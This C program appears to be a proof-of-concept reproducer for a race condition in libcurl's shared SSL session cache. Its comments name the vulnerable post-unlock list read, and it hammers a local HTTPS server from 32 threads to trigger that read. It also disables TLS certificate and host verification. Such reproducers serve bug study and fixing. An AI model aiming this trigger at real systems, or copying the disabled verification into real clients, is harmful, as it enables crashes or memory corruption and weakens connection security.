#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <curl/curl.h>

#define THREAD_SIZE 32
#define LOOPS 60

struct Ctx {
  CURLSH *share;
  const char *url;
  int ok;
  int fail;
};

static pthread_mutex_t mutexes[CURL_LOCK_DATA_LAST];

static void test_lock(CURL *handle, curl_lock_data data,
                       curl_lock_access laccess, void *useptr) {
  (void)handle; (void)laccess; (void)useptr;
  pthread_mutex_lock(&mutexes[data]);
}
static void test_unlock(CURL *handle, curl_lock_data data, void *useptr) {
  (void)handle; (void)useptr;
  pthread_mutex_unlock(&mutexes[data]);
}

static size_t write_cb(char *ptr, size_t size, size_t nmemb, void *userdata) {
  (void)ptr; (void)userdata;
  return size * nmemb;
}

/* swallow verbose debug output so we do not flood the log, but keep
   CURLOPT_VERBOSE active so the internal CURL_TRC_CF() tracing macro
   actually evaluates its (racy) arguments, matching the code path that
   reads the session-cache list right after it was unlocked. */
static int debug_cb(CURL *h, curl_infotype type, char *data, size_t size,
                     void *userp) {
  (void)h; (void)type; (void)data; (void)size; (void)userp;
  return 0;
}

static void *test_thread(void *arg) {
  struct Ctx *ctx = (struct Ctx *)arg;
  int i;
  for(i = 0; i < LOOPS; i++) {
    CURL *curl = curl_easy_init();
    if(!curl)
      continue;
    curl_easy_setopt(curl, CURLOPT_URL, ctx->url);
    curl_easy_setopt(curl, CURLOPT_SHARE, ctx->share);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_cb);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
    curl_easy_setopt(curl, CURLOPT_DEBUGFUNCTION, debug_cb);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
    curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
    curl_easy_setopt(curl, CURLOPT_FRESH_CONNECT, 1L);
    CURLcode res = curl_easy_perform(curl);
    if(res != CURLE_OK) {
      ctx->fail++;
      if(ctx->fail <= 3)
        fprintf(stderr, "perform failed: %s\n", curl_easy_strerror(res));
    }
    else {
      ctx->ok++;
    }
    curl_easy_cleanup(curl);
  }
  return NULL;
}

int main(int argc, char **argv) {
  const char *url = argc > 1 ? argv[1] : "https://127.0.0.1:8443/";
  int i;
  pthread_t th[THREAD_SIZE];
  struct Ctx ctx[THREAD_SIZE];
  CURLSH *share;
  int total_ok = 0, total_fail = 0;

  /* enable per-component tracing globally so the CURL_TRC_CF() macro's
     guard (Curl_trc_cf_is_verbose) is actually satisfied and it evaluates
     its arguments -- this is required to exercise the vulnerable
     Curl_llist_count(&peer->sessions) call that happens after the cache
     lock has been released in Curl_ssl_scache_take(). */
  curl_global_trace("all");
  curl_global_init(CURL_GLOBAL_ALL);
  share = curl_share_init();
  for(i = 0; i < CURL_LOCK_DATA_LAST; i++)
    pthread_mutex_init(&mutexes[i], NULL);
  curl_share_setopt(share, CURLSHOPT_LOCKFUNC, test_lock);
  curl_share_setopt(share, CURLSHOPT_UNLOCKFUNC, test_unlock);
  curl_share_setopt(share, CURLSHOPT_SHARE, CURL_LOCK_DATA_SSL_SESSION);

  for(i = 0; i < THREAD_SIZE; i++) {
    ctx[i].share = share;
    ctx[i].url = url;
    ctx[i].ok = 0;
    ctx[i].fail = 0;
    pthread_create(&th[i], NULL, test_thread, &ctx[i]);
  }
  for(i = 0; i < THREAD_SIZE; i++) {
    pthread_join(th[i], NULL);
    total_ok += ctx[i].ok;
    total_fail += ctx[i].fail;
  }

  curl_share_cleanup(share);
  curl_global_cleanup();
  printf("done ok=%d fail=%d\n", total_ok, total_fail);
  return 0;
}
